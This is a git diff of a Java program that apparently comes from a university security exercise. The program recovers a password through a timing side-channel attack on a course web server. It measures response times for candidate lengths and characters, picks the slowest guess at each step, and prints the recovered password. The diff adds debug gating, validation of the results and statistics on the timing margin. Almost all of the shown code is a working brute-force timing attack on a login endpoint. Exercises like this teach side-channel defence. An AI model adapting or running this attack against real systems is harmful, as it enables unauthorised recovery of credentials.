@@ -11,20 +11,20 @@ import java.util.Map;
 import static java.lang.System.exit;
 
 
-public class ex01_M1 {
+public class ex01_M2 {
 
     // Const
     public static int NANOSECONDS_IN_MILLISECONDS = 1000000;
 
     // Configuration
     public static int MIN_PASSWORD_LENGTH = 1;
-    public static int MAX_PASSWORD_LENGTH = 16;
+    public static int MAX_PASSWORD_LENGTH = 32;
     public static int CHECK_PASSWORD_LENGTH_ATTEMPTS = 1;
     public static int CHECK_PASSWORD_CHARS_ATTEMPTS = 1;
     public static int DEBUG_MESSAGE_COUNT = 1;
     public static boolean DEBUG_MESSAGE = true;
     public static int DIFFICULTY = 1;
-    public static String QUERY_ID = "ID";
+    public static String USER_ID = "ID";
 
     // Flags
     public static long FOUND_THE_PASSWORD = -1;
@@ -60,12 +60,16 @@ public class ex01_M1 {
             }
 
         } catch (MalformedURLException e) {
-            System.out.println("Invalid URL Format:");
-            System.out.println(url);
+            if(DEBUG_MESSAGE) {
+                System.out.println("Invalid URL Format:");
+                System.out.println(url);
+            }
             return ERROR_WHILE_CHECK_TIME;
         } catch (IOException e) {
-            System.out.println("Failed connect to the URL server:");
-            System.out.println(url);
+            if(DEBUG_MESSAGE) {
+                System.out.println("Failed connect to the URL server:");
+                System.out.println(url);
+            }
             return ERROR_WHILE_CHECK_TIME;
         }
 
@@ -74,7 +78,13 @@ public class ex01_M1 {
 
     public static String buildUrlFromPassword(String password)
     {
-        return String.format("http://aoi.ise.bgu.ac.il/?user=%s&password=%s&difficulty=%d", QUERY_ID, password, DIFFICULTY);
+        return String.format("http://aoi.ise.bgu.ac.il/?user=%s&password=%s&difficulty=%d", USER_ID, password, DIFFICULTY);
+    }
+
+    public static void foundTheRightPassword(String password)
+    {
+        System.out.println(USER_ID + " " + password + " " + DIFFICULTY);
+        exit(0);
     }
 
     public static class PossiblePasswordData{
@@ -114,8 +124,7 @@ public class ex01_M1 {
 
                 if (responseTime == FOUND_THE_PASSWORD)
                 {
-                    System.out.println(String.format("Found the password! The *REAL* password is %s", password));
-                    exit(0);
+                    foundTheRightPassword(password);
                 }
                 else if(responseTime == ERROR_WHILE_CHECK_TIME)
                 {
@@ -133,6 +142,35 @@ public class ex01_M1 {
         return result;
     }
 
+    public static void validateAttackResults(Map<String, PossiblePasswordData> results, int checksAttempts)
+    {
+        for (String password : results.keySet())
+        {
+            if(results.get(password).passwordErrors == checksAttempts) {
+                System.out.println("We have a problem");
+                exit(0);
+            }
+        }
+    }
+
+    public static double calculatePercentageChosenPasswordBiggerThenOther(Map<String, PossiblePasswordData> results, String chosenPassword)
+    {
+        Long sumOfRestOfThePasswords = 0L;
+        Integer attemptCountOfRestOfThePasswords = 0;
+        for (String password: results.keySet()) {
+            if (password.equals(chosenPassword)) {
+                continue;
+            }
+            sumOfRestOfThePasswords += results.get(password).passwordSumTime;
+            attemptCountOfRestOfThePasswords += results.get(password).passwordAttempts;
+        }
+
+        double chosenPasswordAverage = results.get(chosenPassword).passwordSumTime / results.get(chosenPassword).passwordAttempts;
+        double otherPasswordsAverage = sumOfRestOfThePasswords / attemptCountOfRestOfThePasswords;
+
+        return chosenPasswordAverage / otherPasswordsAverage;
+    }
+
     public static int checkPasswordLength() {
         List<String> possiblePasswords = new ArrayList<String>();
 
@@ -142,6 +180,7 @@ public class ex01_M1 {
         }
 
         Map<String, PossiblePasswordData> results = executeTimingAttack(possiblePasswords, CHECK_PASSWORD_LENGTH_ATTEMPTS, DEBUG_MESSAGE);
+        validateAttackResults(results, CHECK_PASSWORD_LENGTH_ATTEMPTS);
 
         String maxAveragePassword = possiblePasswords.get(0);
         double maxAverage = results.get(maxAveragePassword).passwordSumTime / results.get(maxAveragePassword).passwordAttempts;
@@ -149,7 +188,7 @@ public class ex01_M1 {
         for (String password: possiblePasswords) {
             double currentAverage = results.get(password).passwordSumTime / results.get(password).passwordAttempts;
 
-            if(DEBUG_MESSAGE) {
+            if (DEBUG_MESSAGE) {
                 System.out.println(String.format("Length %d took %f milliseconds", password.length(), currentAverage / NANOSECONDS_IN_MILLISECONDS));
             }
             if (currentAverage > maxAverage)
@@ -157,6 +196,11 @@ public class ex01_M1 {
                 maxAveragePassword = password;
                 maxAverage = currentAverage;
             }
+        }
+
+        if (DEBUG_MESSAGE) {
+            double percentageBigger = calculatePercentageChosenPasswordBiggerThenOther(results, maxAveragePassword);
+            System.out.println(String.format("Length %d bigger then other by %f", maxAveragePassword.length(), percentageBigger));
         }
 
         return maxAveragePassword.length();
@@ -181,6 +225,7 @@ public class ex01_M1 {
             }
 
             Map<String, PossiblePasswordData> results = executeTimingAttack(possiblePasswords, CHECK_PASSWORD_CHARS_ATTEMPTS, DEBUG_MESSAGE);
+            validateAttackResults(results, CHECK_PASSWORD_CHARS_ATTEMPTS);
 
             String maxAveragePasswordChar = possiblePasswords.get(0);
             double maxAverage = results.get(maxAveragePasswordChar).passwordSumTime / results.get(maxAveragePasswordChar).passwordAttempts;
@@ -199,8 +244,15 @@ public class ex01_M1 {
                 }
 
             }
+
             charactersFoundFromPassword = String.format("%s%c", charactersFoundFromPassword, maxAveragePasswordChar.charAt(currentPasswordIndex));
-            System.out.println(String.format("Password until now is %s", charactersFoundFromPassword));
+            if(DEBUG_MESSAGE) {
+
+                double percentageBigger = calculatePercentageChosenPasswordBiggerThenOther(results, maxAveragePasswordChar);
+                System.out.println(String.format("char %c bigger then other by %f", maxAveragePasswordChar.charAt(currentPasswordIndex), percentageBigger));
+
+                System.out.println(String.format("Password until now is %s", charactersFoundFromPassword));
+            }
         }
 
         return charactersFoundFromPassword;
@@ -208,12 +260,15 @@ public class ex01_M1 {
 
     public static void main(String[] args) {
         int passwordLength = checkPasswordLength();
-        System.out.println(String.format("Password length is %d", passwordLength));
+        if(DEBUG_MESSAGE) {
+            System.out.println(String.format("Password length is %d", passwordLength));
+        }
 
         String password = checkThePassword(passwordLength);
-        System.out.println(String.format("The password is %s", password));
+        if(DEBUG_MESSAGE) {
+            System.out.println(String.format("The password is %s", password));
+        }
 
-        long responseTime = checkResponseTime(buildUrlFromPassword(password));
-        System.out.println(String.format("The REAL password is %s", password));
+        foundTheRightPassword(password);
     }
 }
